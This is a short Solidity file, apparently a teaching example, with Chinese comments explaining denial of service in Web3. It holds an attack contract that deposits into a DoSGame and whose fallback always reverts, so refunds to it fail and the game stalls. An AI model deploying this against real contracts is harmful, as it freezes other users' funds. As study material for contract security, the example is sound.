// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import './DosGame.sol';

/*
在 Web2 中，拒绝服务攻击（DoS，Denial of Service）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。
而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。
*/
contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable{
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}